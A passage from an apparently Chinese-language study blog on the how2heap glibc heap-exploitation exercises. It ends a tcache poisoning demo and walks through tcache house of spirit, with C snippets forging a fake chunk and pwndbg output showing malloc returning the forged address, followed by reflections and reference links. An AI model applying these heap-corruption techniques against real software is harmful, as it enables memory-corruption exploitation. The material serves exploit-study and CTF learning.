```
pwndbg> bins
tcachebins
0x90 [  1]: 0x8402260 —? 0x7ffffffedd98 —? 0x8000650 (_start) ?— xor    ebp, ebp /* 0x89485ed18949ed31 */
```

接下来申请一次 `malloc(128)` ，tcachebins 变为：

```
pwndbg> tcachebins
tcachebins
0x90 [  0]: 0x7ffffffedd98 —? 0x8000650 (_start) ?— xor    ebp, ebp /* 0x89485ed18949ed31 */
```

发现我们第一次申请的那块内存被分配出去了。接下来在申请一次（`malloc(128)`）：

```
2nd malloc(128): 0x7ffffffedd98
```

此时会发现已经把我们想要的地址分配出来了。

## tcache_house_of_spirit

Frees a fake chunk to get malloc to return a nearly-arbitrary pointer.
释放掉一块 fake chunk，然后申请内存以返回几乎任意的指针。

### 解释

这个文件描述了 tcache 上的 house of spirit 攻击。

它和通常的 house of spirit 攻击类似，但你不必在将被释放的 fake chunk 后新建一个 fake chunk。

你可以在 `malloc.c` 中的函数 `_int_free` 中看到这一点：调用 `tcache_put` 却没有检查下一块的大小和 `prev_inuse` 位是否合理。

可以通过搜索字符串 `invalid next size` 和 `double free or corruption` 来找到相关的信息。

在这里，我们先 `malloc(1)` 以初始化内存空间。

首先假设我们可以溢出并覆盖一个指针以指向 fake chunk 的地址。

``` c
	unsigned long long *a; //pointer that will be overwritten
	unsigned long long fake_chunks[10]; //fake chunk region
```

上面即是我们假设的被覆盖的指针和 fake chunk。

这个区域包含一个 fake chunk，它的 size 值位于 `fake_chunk[1]`。

这个 chunk 的大小必须落入到 tcache 的类中（chunk.size <= 0x410，在 x64 上 malloc arg <= 0x408）。对于 tcache 块，`PREV_INUSE(lsb)` 位被 `free` 忽略，但是 `IS_MMAPPED(第二个 lsb)` 和 `NON_MAIN_ARENA(第三个 lsb)` 位会导致某些问题。

还要注意的一点是 malloc 的对齐，在 x64 中，0x30~0x38 都会被对齐到 0x40。

``` c
fake_chunks[1] = 0x40; // this is the size
```

将 size 位设为 0x40。接下来用第一块 fake chunk 内的伪区域地址覆盖我们的指针 fake_chunk，且还需注意与此块关联的内存地址必须是 16 字节对齐的。

```
pwndbg> x/4gx fake_chunks
0x7ffffffedd50: 0x0000000000000009      0x0000000000000040
0x7ffffffedd60: 0x00007ffffffeddc8      0x0000000000f0b6ff
```

``` c
a = &fake_chunks[2];
```

```
pwndbg> p/x a
$1 = 0x7ffffffedd60
```

接下来释放这个被覆盖的指针。

``` c
free(a);
```

此时的 tcachebins：

```
pwndbg> bins
tcachebins
0x40 [  1]: 0x7ffffffedd60 ?— 0x0
```

之后的 malloc 会返回 `fake_chunks[1]` 的区域，也就是 `fake_chunks[2]` 的地址：

```
malloc(0x30): 0x7ffffffedd60
```

# 总结

根据参考文章走了一遍 how2heap 的流程，收获还是蛮多的。之前一看堆题就头大，静下心来刷一遍 how2heap 之后发现如果只是利用的话并不麻烦。但是想要更深入了解原理的话还得多看源代码。接下来就是做做题巩固一下知识，继续深入理解源代码了。

# 参考文章

[linux程序的常用保护机制](https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/)

[通过 how2heap 复习堆利用 (一）](https://xz.aliyun.com/t/2582)

[【技术分享】how2heap总结-下](https://www.anquanke.com/post/id/86809)

[3.1.9 Linux 堆利用（四）](https://firmianay.gitbooks.io/ctf-all-in-one/doc/3.1.9_heap_exploit_4.html)

[glibc内存管理ptmalloc源代码分析.pdf](https://paper.seebug.org/papers/Archive/refs/heap/glibc%e5%86%85%e5%ad%98%e7%ae%a1%e7%90%86ptmalloc%e6%ba%90%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90.pdf)

[4.13 利用 _IO_FILE 结构](https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.13_io_file.html)

[4.14 glibc tcache 机制](https://firmianay.gitbooks.io/ctf-all-in-one/doc/4.14_glibc_tcache.html)

[Tcache Attack](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/)
